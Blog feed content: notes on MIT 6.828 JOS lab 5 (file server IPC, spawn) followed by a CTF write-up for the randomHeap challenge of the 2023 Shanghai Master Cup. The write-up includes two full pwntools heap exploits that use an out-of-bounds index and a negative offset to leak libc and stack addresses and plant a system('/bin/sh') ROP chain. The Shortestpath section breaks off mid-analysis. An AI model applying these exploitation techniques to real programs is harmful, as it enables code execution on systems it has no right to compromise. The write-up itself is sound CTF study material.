class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Dev</span> *<span class="title">devtab</span>[] =</span></span><br><span class="line">{</span><br><span class="line">&amp;devfile,</span><br><span class="line">&amp;devsock,</span><br><span class="line">&amp;devpipe,</span><br><span class="line">&amp;devcons,</span><br><span class="line"><span class="number">0</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Dev</span> <span class="title">devfile</span> =</span></span><br><span class="line">{</span><br><span class="line">.dev_id =<span class="string">'f'</span>,</span><br><span class="line">.dev_name =<span class="string">"file"</span>,</span><br><span class="line">.dev_read =devfile_read,</span><br><span class="line">.dev_close =devfile_flush,</span><br><span class="line">.dev_stat =devfile_stat,</span><br><span class="line">.dev_write =devfile_write,</span><br><span class="line">.dev_trunc =devfile_trunc</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h6 id="read"><a href="#read" class="headerlink" title="read"></a>read</h6><p>lib中的read函数根据文件的类型(devid)分发到特定的IO函数实现,这里以devfile_read为例.</p><p>向server发送FSREQ_READ请求,server从硬盘中读取对应文件数据到内存(别忘了JOS实现中是将整个3GB的硬盘映射到fs server的虚拟地址空间中)中,再经两次拷贝到用户进程要求的缓冲区中.</p><p>可以看出devfile_read设计成每次最多读取PGSIZE字节,因为这受限于我们的IPC机制.记得在server_read中处理参数n防止缓冲区溢出.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">devfile_read</span><span class="params">(<span class="keyword">struct</span> Fd *fd, <span class="type">void</span> *buf, <span class="type">size_t</span> n)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// Make an FSREQ_READ request to the file system server after</span></span><br><span class="line"><span class="comment">// filling fsipcbuf.read with the request arguments.  The</span></span><br><span class="line"><span class="comment">// bytes read will be written back to fsipcbuf by the file</span></span><br><span class="line"><span class="comment">// system server.</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line">fsipcbuf.read.req_fileid = fd-&gt;fd_file.id;</span><br><span class="line">fsipcbuf.read.req_n = n;</span><br><span class="line"><span class="keyword">if</span> ((r = fsipc(FSREQ_READ, <span class="literal">NULL</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">assert(r &lt;= n);</span><br><span class="line">assert(r &lt;= PGSIZE);</span><br><span class="line">memmove(buf, fsipcbuf.readRet.ret_buf, r);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>实现中的union Fsipc挺有意思.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">Fsipc</span> {</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Fsret_read</span> {</span></span><br><span class="line"><span class="type">char</span> ret_buf[PGSIZE];</span><br><span class="line">} readRet;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h6 id="write"><a href="#write" class="headerlink" title="write"></a>write</h6><p>和read区别不大.</p><h5 id="lab代码"><a href="#lab代码" class="headerlink" title="lab代码"></a>lab代码</h5><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">   <span class="type">int</span></span><br><span class="line">   <span class="title function_">serve_read</span><span class="params">(<span class="type">envid_t</span> envid, <span class="keyword">union</span> Fsipc *ipc)</span></span><br><span class="line">   {</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">Fsreq_read</span> *<span class="title">req</span> =</span> &amp;ipc-&gt;read;</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">Fsret_read</span> *<span class="title">ret</span> =</span> &amp;ipc-&gt;readRet;</span><br><span class="line">       <span class="keyword">if</span> (debug)</span><br><span class="line">           cprintf(<span class="string">"serve_read %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);</span><br><span class="line">       <span class="comment">// Lab 5: Your code here:</span></span><br><span class="line">       <span class="type">int</span> r;</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">po</span>;</span></span><br><span class="line">       </span><br><span class="line">       <span class="keyword">if</span> ((r = openfile_lookup(envid, req-&gt;req_fileid, &amp;po)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//防止溢出</span></span><br><span class="line"><span class="keyword">if</span>(req-&gt;req_n&gt;PGSIZE)</span><br><span class="line">req-&gt;req_n = PGSIZE;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ((r = file_read(po-&gt;o_file, ret-&gt;ret_buf, req-&gt;req_n, po-&gt;o_fd-&gt;fd_offset)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       po-&gt;o_fd-&gt;fd_offset += r;</span><br><span class="line">       <span class="keyword">return</span> r;</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span></span><br><span class="line">   <span class="title function_">serve_write</span><span class="params">(<span class="type">envid_t</span> envid, <span class="keyword">struct</span> Fsreq_write *req)</span></span><br><span class="line">   {</span><br><span class="line">       <span class="keyword">if</span> (debug)</span><br><span class="line">           cprintf(<span class="string">"serve_write %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);</span><br><span class="line">       <span class="comment">// LAB 5: Your code here.</span></span><br><span class="line">       <span class="type">int</span> r;</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">po</span>;</span></span><br><span class="line">       <span class="keyword">if</span> ((r = openfile_lookup(envid, req-&gt;req_fileid, &amp;po)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       <span class="keyword">if</span> ((r = file_write(po-&gt;o_file, req-&gt;req_buf, req-&gt;req_n, po-&gt;o_fd-&gt;fd_offset)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       po-&gt;o_fd-&gt;fd_offset += r;</span><br><span class="line">       <span class="keyword">return</span> r;</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">   <span class="title function_">devfile_write</span><span class="params">(<span class="keyword">struct</span> Fd *fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> n)</span></span><br><span class="line">   {</span><br><span class="line">       <span class="comment">// Make an FSREQ_WRITE request to the file system server.  Be</span></span><br><span class="line">       <span class="comment">// careful: fsipcbuf.write.req_buf is only so large, but</span></span><br><span class="line">       <span class="comment">// remember that write is always allowed to write *fewer*</span></span><br><span class="line">       <span class="comment">// bytes than requested.</span></span><br><span class="line">       <span class="comment">// LAB 5: Your code here</span></span><br><span class="line">       <span class="keyword">if</span> (n &gt; <span class="keyword">sizeof</span>(fsipcbuf.write.req_buf))</span><br><span class="line">           panic(<span class="string">"devfile_write: invalid n\n"</span>);</span><br><span class="line">       fsipcbuf.write.req_fileid = fd-&gt;fd_file.id;</span><br><span class="line">       fsipcbuf.write.req_n = n;</span><br><span class="line">       memmove(fsipcbuf.write.req_buf, buf, n);</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">return</span> fsipc(FSREQ_WRITE, <span class="literal">NULL</span>);</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure><h3 id="Spawning-Processes"><a href="#Spawning-Processes" class="headerlink" title="Spawning Processes"></a>Spawning Processes</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_env_set_trapframe</span><span class="params">(<span class="type">envid_t</span> envid, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="comment">// Remember to check whether the user has supplied us with a good</span></span><br><span class="line"><span class="comment">// address!</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line">    <span class="keyword">if</span> ((r = envid2env(envid, &amp;e, <span class="number">1</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    user_mem_assert(curenv, (<span class="type">void</span> *)tf, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Trapframe), <span class="number">0</span>); </span><br><span class="line">    </span><br><span class="line">    memmove(&amp;e-&gt;env_tf, tf, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Trapframe));</span><br><span class="line">    e-&gt;env_tf.tf_cs |= <span class="number">3</span>;</span><br><span class="line">    e-&gt;env_tf.tf_eflags |= FL_IF;</span><br><span class="line">    e-&gt;env_tf.tf_eflags &amp;= ~FL_IOPL_MASK;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="Sharing-library-state-across-fork-and-spawn"><a href="#Sharing-library-state-across-fork-and-spawn" class="headerlink" title="Sharing library state across fork and spawn"></a>Sharing library state across fork and spawn</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copy the mappings for shared pages into the child address space.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">copy_shared_pages</span><span class="params">(<span class="type">envid_t</span> child)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pde_t</span> uvpd[];</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pte_t</span> uvpt[];</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">uintptr_t</span> va=<span class="number">0</span>;va&lt;UTOP;)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((uvpd[va &gt;&gt; PDXSHIFT]&amp;PTE_P)==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">va += PGSIZE*NPTENTRIES;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> perm = uvpt[va &gt;&gt; PTXSHIFT] &amp; PTE_SYSCALL;</span><br><span class="line">        <span class="keyword">if</span> ((perm &amp; PTE_P) == <span class="number">0</span>) {    <span class="comment">// Page not mapped.</span></span><br><span class="line">            va += PGSIZE;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (perm &amp; PTE_SHARE) {</span><br><span class="line">            <span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, (<span class="type">void</span> *)va, child, (<span class="type">void</span> *)va, perm)) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> r;</span><br><span class="line">        }</span><br><span class="line">        va += PGSIZE;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中华武数杯2023 WP</title>
      <link href="/2023/Shanghai-Master-WP/"/>
      <url>/2023/Shanghai-Master-WP/</url>
      
        <content type="html"><![CDATA[<p>最喜欢的高版本堆题,挺有意思的.<br><del>所以到底叫上海大师杯还是中华武数杯</del></p><h1 id="randomHeap"><a href="#randomHeap" class="headerlink" title="randomHeap"></a>randomHeap</h1><p>glibc2.35堆,保护全开</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310171525325.png"></p><p>程序实现了这样的堆管理结构.初始化时,分配了16个堆管理结构和16个大小为0x28字节的堆块,放入chunk_list和chunk_manager_list.正常情况下这两个结构应该是用户不可见的.</p><span id="more"></span><p>用户的对堆块的操作是通过user_chunk_manager_list,每次add会从chunk_manager_list取出一个堆管理结构的指针放到user_manager_list中,不涉及malloc的操作.</p><p>这三个list之间的id是随机产生的,没有对应关系.且堆块和堆管理结构的分配顺序也是随机的.</p><p>在show的时候没有对idx的判断,可以将IO_2_1_stdin_结构作为伪造的堆管理结构,泄露出libc地址.在edit的时候也没有对offset的判断.可以使offset为负数来修改某个堆块上方的堆管理结构,由于堆块和管理结构产生顺序随机,这里需要爆破一下,之后就可以完成任意地址读写.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310171526228.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">lg = <span class="keyword">lambda</span> x, y: log.success(<span class="string">f'<span class="subst">{x}</span>: <span class="subst">{<span class="built_in">hex</span>(y)}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line">    p.init(io,e,libc)</span><br><span class="line">    show(-<span class="number">34</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">    io.recv(<span class="number">5</span>)</span><br><span class="line">    p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x21ba80</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">        add(i,<span class="string">'b\n'</span>)</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(p.environ_addr))</span><br><span class="line">    stack = <span class="number">0</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">        show(i)</span><br><span class="line">        io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        r = io.recv(<span class="number">8</span>,timeout=<span class="number">0.2</span>)</span><br><span class="line">        stack = u64(r)-<span class="number">0x120</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(stack).startswith(<span class="string">'0x7ff'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = i</span><br><span class="line">            lg(<span class="string">"stack"</span>,stack)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.libc_rdi))</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">8</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.binsh_addr))</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">0x10</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.libc_ret))</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">0x18</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.system_addr))</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">if</span> p.recvflag():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>init的时候分配了这样的大堆块,可以部分覆写chunk_manager的指针来指向这些大块,释放进largebin再泄露地址.</p><p>预期解爆破挺不容易的,要爆堆布局和爆一位ASLR.可以用扫描所有堆结构尝试泄露地址的方式来减少堆布局的爆破.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310172133067.png"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">lg = <span class="keyword">lambda</span> x, y: log.success(<span class="string">f'<span class="subst">{x}</span>: <span class="subst">{<span class="built_in">hex</span>(y)}</span>'</span>)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive() <span class="keyword">if</span> io.connected() <span class="keyword">else</span> io.close()</span><br><span class="line">one_gadget = <span class="keyword">lambda</span> filename=LIBC: <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    remain = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">2</span>,<span class="number">15</span>))</span><br><span class="line">    io = process(binary)</span><br><span class="line">    p.init(io,e,libc)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        add(i,<span class="string">'b\n'</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,<span class="string">b'\x90\xa0\n'</span>)</span><br><span class="line">    heap = <span class="number">0</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">15</span>):</span><br><span class="line">        show(i)</span><br><span class="line">        io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        r = io.recv(<span class="number">8</span>,timeout=<span class="number">0.2</span>)</span><br><span class="line">        heap = u64(r)-<span class="number">0x120</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(heap).startswith(<span class="string">'0x55'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = i</span><br><span class="line">            lg(<span class="string">"idx"</span>,idx)</span><br><span class="line">            <span class="comment"># pause()</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,<span class="string">b'\xa0\xa2\n'</span>)</span><br><span class="line">    delete(idx)</span><br><span class="line">    <span class="built_in">print</span>(idx)</span><br><span class="line">    <span class="built_in">print</span>(remain)</span><br><span class="line">    remain.remove(idx)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">16</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,<span class="string">b'\xa0\xa2\n'</span>)</span><br><span class="line">    heap = <span class="number">0</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> remain:</span><br><span class="line">        show(i)</span><br><span class="line">        io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        r = io.recv(<span class="number">8</span>,timeout=<span class="number">0.2</span>)</span><br><span class="line">        addr = u64(r)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(addr).startswith(<span class="string">'0x7f'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = i</span><br><span class="line">            lg(<span class="string">"idx:"</span>,idx)</span><br><span class="line">            <span class="comment"># pause()</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    show(idx)</span><br><span class="line">    io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">    p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x219ce0</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(p.environ_addr))</span><br><span class="line">    io.recv()</span><br><span class="line">    show(idx)</span><br><span class="line">    io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">    stack = p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x120</span></span><br><span class="line">    lg(<span class="string">"stack"</span>,stack)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(stack))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.libc_base+<span class="number">0x2a745</span>))</span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">8</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.binsh_addr))</span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">0x18</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.system_addr))</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">if</span> p.recvflag():</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure><h1 id="Shortestpath"><a href="#Shortestpath" class="headerlink" title="Shortestpath"></a>Shortestpath</h1><p>2.35堆,保护全开</p><h2 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h2><p>是一个求图中两点间最短路径的程序,算法大概是从起点开始广搜然后比较所有能到达终点的路径长度(<del>一点算法不懂的表示很难逆</del>).</p><p>程序的图是用如下结构来表示的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192032023.png"></p><p>可以无限制的创建结点和边,输入函数有个offbynull,且可以绕开’\0’的截断,由此可以将tcache和unsortedbin中的堆拿出来,泄露堆和libc地址.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192035153.png"></p><p>现在就差任意写了,看看最短路径函数.<br>变量命名有点逆天,因为我是按照刚学的算法逆的,逆完发现就是个广搜.</p><p><img 